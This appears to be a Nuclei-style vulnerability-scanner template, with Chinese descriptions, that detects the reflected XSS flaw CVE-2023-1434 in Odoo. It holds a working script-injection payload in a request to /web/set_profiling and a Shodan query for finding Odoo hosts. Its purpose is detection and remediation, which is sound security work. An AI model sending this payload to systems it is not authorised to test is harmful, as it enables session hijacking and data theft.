id: odoo-xss

info:
  name: Odoo - 跨站脚本漏洞（CVE-2023-1434）
  author: DhiyaneshDK
  severity: medium
  description: |-
    Odoo 存在安全漏洞。攻击者可通过 /web/set_profiling?profile=0 的 profile, collectors 参数 注入恶意脚本，并在受害者浏览器上下文中执行任意 JavaScript。该模板通过请求 /web/set_profiling?profile=0，并结合响应中的 <script>alert(document.domain)</script>、"params":、session 等特征进行验证。
  impact: |-
    - 攻击者可在受害者浏览器中执行恶意脚本，导致会话劫持、页面篡改或敏感信息窃取。
    - 若漏洞位于后台或高权限页面，还可能被用于冒充受害者执行管理操作。
  remediation: |-
    - 尽快将 Odoo 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 对所有可控输入执行严格过滤与输出编码，避免未经过滤的脚本、HTML 标签或事件处理器进入页面响应。
  reference:
    - https://www.sonarsource.com/blog/odoo-get-your-content-type-right-or-else
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1434
  classification:
    cwe-id: CWE-79
    cpe: cpe:2.3:a:odoo:odoo:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Odoo"
    product: odoo
    vendor: odoo
  tags: odoo,xss,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>'
          - '"params":'
          - 'session'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
